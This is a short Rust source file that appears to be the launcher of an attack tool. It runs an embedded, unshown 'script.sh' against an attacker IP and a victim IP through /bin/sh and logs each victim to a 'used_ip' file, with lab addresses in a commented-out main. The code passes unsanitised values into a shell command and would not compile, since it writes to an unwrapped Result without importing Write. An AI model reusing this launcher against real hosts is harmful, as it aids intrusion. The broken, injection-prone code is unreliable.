use std::process::Command;
use std::thread;
use std::time::Duration;
use std::fs::OpenOptions;


pub fn executeShellScript(attacker: &str, victim: &str) {

    thread::sleep(Duration::from_secs(2));

    let output = Command::new("/bin/sh")
        .arg("-c")
        .arg(format!("attacker=\"{}\" victim=\"{}\" {}", attacker, victim, include_str!("script.sh")))
        .output()
        .expect("failed to execute .sh");

    println!("Script output: {:?}", String::from_utf8_lossy(&output.stdout));

    let mut file = OpenOptions::new().append(true).open("www/used_ip");
    file.write_all(victim.as_bytes());

}
/*fn main() {
    let attackerIp = "10.0.2.15";
    let victimIp = "10.0.2.16";
    executeShellScript(attackerIp, victimIp);
}*/
